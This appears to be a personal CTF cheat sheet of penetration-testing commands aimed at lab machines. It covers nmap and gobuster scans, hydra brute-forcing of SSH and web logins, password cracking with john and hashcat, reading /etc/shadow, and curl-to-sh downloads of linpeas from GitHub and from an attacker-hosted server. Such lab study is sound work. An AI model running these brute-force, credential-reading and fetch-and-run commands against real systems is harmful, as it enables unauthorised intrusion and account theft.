# CTFNotes

## random stuff
https://gchq.github.io/CyberChef/

https://md5decrypt.net/en/

https://10015.io/tools/sha1-encrypt-decrypt

https://wigle.net/

https://www.revshells.com/

https://github.com/xnomas/TryHackMe-Writeups/tree/main/JPGchat


```zsh
cat ~/.zsh_history
sudo dpkg -i
nc -lvnp 2144
sudo python3 -m http.server 80
ncat 10.10.25.140 3000
chmod +x 
cat /etc/shadow
cd ~/.ssh/ 
service bluetooth restart
sudo killall openvpn 
export IP={Machine IP}
```
## ovpn
```zsh
sudo openvpn /path/to/file.ovpn
```
## nmap
```zsh
nmap -sC -sV 10.10.86.183
```
```zsh
nmap -p-15000 -vv TARGET_IP -oG initial-scans
```
```zsh
nmap -T4 -A -p- 
```
## dirb
```zsh
dirb http://10.10.86.183/

```

## gobuster 
```zsh 
gobuster dir -u http://10.10.56.31/ -w /usr/share/dirb/wordlists/common.txt
```
## less
```zsh
less hello.txt
Hello Mamy
```
(cat)
## find
```zsh
find / -type f -name user.txt 2>/dev/null
```
## Privilege escalation
https://gtfobins.github.io/
```zsh
find / -user root -perm /4000 2>/dev/null
```
```zsh
cat /etc/passwd
```
===> LinPEAS

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

-> From github
```zsh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
-> W/ Local network

#Host
```zsh
sudo python3 -m http.server 80
```
#Victim
```zsh
curl 10.17.72.21/linpeas.sh | sh
```
-> or [scp](https://github.com/2mdtln/CTFNotes?tab=readme-ov-file#scp) it 

## Change Username Hostname 

https://www.youtube.com/watch?v=VM64fH6tEEU&ab_channel=RyanJohn

## hydra 
```zsh
hydra -l ~Username~ -P 'list.txt' ssh://10.10.65.127
```

```zsh
hydra -l admin -P '/home/mamy/Desktop/rockyou.txt' -f 10.10.222.32 http-get /labs/basic_auth/    
```
```zsh
hydra -l admin -P /home/mamy/Desktop/rockyou.txt 10.10.115.52 http-post-form "/admin/:user=admin&pass=^PASS^:F=Username or password invalid" -vV 
```
```zsh
hydra -l John -P /home/mamy/Desktop/rockyou.txt 10.10.56.31 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password" -s 62337
```

## tee
send output to a file

![alt text](/assets/image-1.png)

note: isnt it just ">" ??
```zsh
echo 'Hello Mamy' > ToMamy.txt
```
## Find id-rsa passphrase
```zsh
zssh2john '/home/kali/Desktop/id_rsa' > ToJohn.txt
```
```zsh
john 'ToJohn.txt' --wordlist='/home/kali/Desktop/rockyou.txt' 
```
## enum4linux (Userrames) (too slow)
```zsh
enum4linux 10.10.130.7
```
## binwalk
```zsh
binwalk /home/kali/Desktop/cutie.png      

DECIMAL       HEXADECIMAL     DESCRIPTION
.--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
```zsh
binwalk -e /home/kali/Desktop/cutie.png  

DECIMAL       HEXADECIMAL     DESCRIPTION
.--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
## steghide
```zsh
steghide extract -sf /home/mamy/Desktop/useless/white_rabbit_1.jpg 

 Enter passphrase: 
 wrote extracted data to "hint.txt".  
``` 
## hashcat
```zsh
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt

hashcat -m 0 -a 0 hash.txt '/home/kali/Desktop/rockyou.txt'
```
## airmon
*not finished
```zsh
sudo airmon-ng

PHY     Interface       Driver          Chipset
phy2    wlan0           rtl8xxxu        Realtek Semiconductor Corp. RTL8192EU 802.11b/g/n WLAN Adapter

sudo airmon-ng check kill
                                                         
sudo airmon-ng start wlan0
```
## John
```zsh
sudo ssh2john "/home/mamy/Desktop/useless/id_rsa (copy 1)" > HashForJohn.txt
``` 
```zsh                                             
john /home/mamy/Desktop/HashForJohn.txt --wordlist='/home/mamy/Desktop/rockyou.txt'

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (/home/mamy/Desktop/useless/id_rsa (copy 1))     
1g 0:00:00:00 DONE (2024-08-02 16:26) 3.703g/s 49540p/s 49540c/s 49540C/s 100588..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## scp
```zsh
sudo scp -i id_rsa chisel root@10.200.52.200:/root
```
```zsh
sudo scp <user@machineip>:(file name) /home/kali/Desktop
```
![alt text](/assets/image.png)

## xfreerdp 
```zsh
xfreerdp /v:10.200.52.150 /u:Mamyy /p:123455
```
## sshuttle(vpn to ssh)
```zsh
sudo sshuttle -NHr root@10.200.52.200 --ssh-cmd 'ssh -i id_rsa' 10.200.52.0/24 -x 10.200.52.200
c : Connected to server.
```
##


## crunch
~~~zsh
crunch 3 3 -o otp.txt -t %%% -s 100 -e 200 
~~~

